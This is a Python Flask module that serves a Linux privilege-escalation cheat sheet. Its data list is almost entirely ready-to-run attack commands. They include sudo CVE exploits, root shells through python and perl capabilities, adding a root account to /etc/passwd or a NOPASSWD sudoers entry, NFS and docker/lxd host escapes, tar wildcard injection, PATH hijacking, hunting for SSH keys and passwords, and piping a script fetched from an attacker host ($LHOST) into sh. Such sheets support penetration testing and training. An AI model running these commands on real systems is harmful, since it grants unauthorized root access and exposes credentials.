from flask import Blueprint, render_template

bp = Blueprint("privesc_linux", __name__)

# Programs + commands. Same depth as the Windows tab.
CARDS = [
    {"title": "Automated tools", "hint": "Run one enumerator, then verify by hand.", "blocks": [
        {"tpl": "./linpeas.sh", "lbl": "linPEAS (PEASS-ng)"},
        {"tpl": "./lse.sh -l1", "lbl": "linux-smart-enumeration"},
        {"tpl": "./linux-exploit-suggester.sh", "lbl": "LES"},
        {"tpl": "./pspy64", "lbl": "watch cron/processes as non-root"},
        {"tpl": "./traitor -a", "lbl": "traitor (auto-exploit)"},
        {"tpl": "./deepce.sh", "lbl": "container/docker escapes"},
    ]},
    {"title": "Manual enumeration", "blocks": [
        {"tpl": "id; sudo -l"},
        {"tpl": "uname -a; cat /etc/os-release"},
        {"tpl": "cat /etc/passwd; ls -la /home"},
        {"tpl": "find / -perm -4000 -type f 2>/dev/null", "lbl": "SUID"},
        {"tpl": "find / -perm -2000 -type f 2>/dev/null", "lbl": "SGID"},
        {"tpl": "getcap -r / 2>/dev/null", "lbl": "capabilities"},
        {"tpl": "cat /etc/crontab; ls -la /etc/cron.*"},
        {"tpl": "find / -writable -type d 2>/dev/null", "lbl": "writable dirs"},
        {"tpl": "ps aux | grep -i root"},
        {"tpl": "cat /etc/fstab; mount; cat /etc/exports 2>/dev/null", "lbl": "mounts / NFS"},
        {"tpl": "netstat -tulpn 2>/dev/null; ss -tulpn"},
    ]},
    {"title": "Kernel exploits", "hint": "Match kernel/distro to a PoC; compile on a matching box.", "blocks": [
        {"tpl": "uname -r"},
        {"tpl": "./linux-exploit-suggester.sh -k $(uname -r)", "lbl": "LES"},
        {"tpl": "searchsploit linux kernel <version>"},
        {"tpl": "# DirtyPipe CVE-2022-0847 (5.8-5.16)", "plain": True},
        {"tpl": "# DirtyCow CVE-2016-5195 (< 4.8)", "plain": True},
        {"tpl": "# OverlayFS CVE-2021-3493 / CVE-2023-0386", "plain": True},
    ]},
    {"title": "sudo abuse", "hint": "sudo -l first. Any allowed binary -> check GTFOBins.", "blocks": [
        {"tpl": "sudo -l"},
        {"tpl": "sudo -u#-1 /bin/bash", "lbl": "CVE-2019-14287 (sudo < 1.8.28)"},
        {"tpl": "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')", "lbl": "Baron Samedit CVE-2021-3156"},
        {"tpl": "# env_keep+=LD_PRELOAD -> compile a .so with init that setuid(0)", "plain": True},
        {"tpl": "sudo LD_PRELOAD=/tmp/x.so <allowed_binary>", "lbl": "LD_PRELOAD abuse"},
    ]},
    {"title": "SUID / SGID", "hint": "Compare against GTFOBins; also PATH and .so injection.", "blocks": [
        {"tpl": "find / -perm -4000 -type f 2>/dev/null"},
        {"tpl": "find . -exec /bin/sh -p \\; -quit", "lbl": "SUID find -> GTFOBins"},
        {"tpl": "./suid_binary; # if it calls a binary by relative name, hijack $PATH", "plain": True},
        {"tpl": "strace -f ./suid_binary 2>&1 | grep -i open", "lbl": "spot loaded .so / files"},
    ]},
    {"title": "Capabilities", "hint": "cap_setuid/cap_setgid on an interpreter = instant root.", "blocks": [
        {"tpl": "getcap -r / 2>/dev/null"},
        {"tpl": "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "lbl": "cap_setuid=ep on python"},
        {"tpl": "/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'"},
    ]},
    {"title": "Cron jobs", "hint": "Writable cron script or wildcard = code exec as its owner.", "blocks": [
        {"tpl": "cat /etc/crontab; ls -la /etc/cron.d /etc/cron.*"},
        {"tpl": "grep -R . /etc/cron* 2>/dev/null"},
        {"tpl": "ls -la /path/to/cron_script.sh", "lbl": "writable? append a rev shell"},
        {"tpl": "# tar wildcard: touch './--checkpoint=1' './--checkpoint-action=exec=sh shell.sh'", "lbl": "wildcard injection", "plain": True},
    ]},
    {"title": "PATH hijacking", "hint": "SUID/cron script calls a binary by relative name + writable PATH entry.", "blocks": [
        {"tpl": "echo $PATH"},
        {"tpl": "export PATH=/tmp:$PATH"},
        {"tpl": "echo '/bin/bash -p' > /tmp/<binname>; chmod +x /tmp/<binname>"},
    ]},
    {"title": "Writable sensitive files", "hint": "Check ACLs on the files that grant root.", "blocks": [
        {"tpl": "ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d"},
        {"tpl": "openssl passwd -1 -salt x pass", "lbl": "make a hash for /etc/passwd"},
        {"tpl": "echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd", "lbl": "if /etc/passwd writable"},
        {"tpl": "echo '%USERNAME% ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/x", "lbl": "if sudoers.d writable"},
    ]},
    {"title": "NFS no_root_squash", "hint": "Exported share with no_root_squash -> plant a root SUID from your box.", "blocks": [
        {"tpl": "showmount -e $RHOST; cat /etc/exports"},
        {"tpl": "mount -o rw $RHOST:/share /mnt", "lbl": "on attacker (as root)"},
        {"tpl": "cp /bin/bash /mnt/rootbash; chmod +xs /mnt/rootbash"},
        {"tpl": "/share/rootbash -p", "lbl": "on target"},
    ]},
    {"title": "Docker / LXD group", "hint": "Membership in docker/lxd = root via host mount.", "blocks": [
        {"tpl": "id | grep -Eo 'docker|lxd'"},
        {"tpl": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "lbl": "docker group"},
        {"tpl": "lxc init alpine r -c security.privileged=true; lxc config device add r d disk source=/ path=/mnt; lxc start r; lxc exec r sh", "lbl": "lxd group"},
        {"tpl": "./deepce.sh", "lbl": "enumerate container escapes"},
    ]},
    {"title": "Writable systemd / service units", "hint": "Writable unit or its ExecStart binary -> root on restart.", "blocks": [
        {"tpl": "systemctl list-units --type=service"},
        {"tpl": "find /etc/systemd /lib/systemd -writable 2>/dev/null"},
        {"tpl": "ls -la $(systemctl show -p FragmentPath <svc> --value)"},
    ]},
    {"title": "Credentials hunting", "blocks": [
        {"tpl": "cat ~/.bash_history ~/.*_history 2>/dev/null"},
        {"tpl": "grep -RiaE 'password|passwd|secret|api[_-]?key' /var/www /home /opt /etc 2>/dev/null"},
        {"tpl": "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null", "lbl": "SSH keys"},
        {"tpl": "find / -name '*.kdbx' -o -name '*.bak' 2>/dev/null"},
    ]},
    {"title": "Transfer from $LHOST", "blocks": [
        {"tpl": "wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"},
        {"tpl": "curl http://$LHOST/linpeas.sh | sh"},
        {"tpl": "scp tool user@$RHOST:/tmp/"},
    ]},
]


@bp.route("/privesc/linux")
def index():
    return render_template("cheat.html", active="privesc_linux",
                           title="Linux privilege escalation", tag="privesc",
                           intro="Local privesc paths: enumeration, sudo, SUID/capabilities, cron, writable files, containers, kernel.",
                           cards=CARDS)


MODULE = {"id": "privesc_linux", "title": "Linux", "category": "Privilege Escalation",
          "order": 1, "blueprint": bp, "endpoint": "privesc_linux.index"}
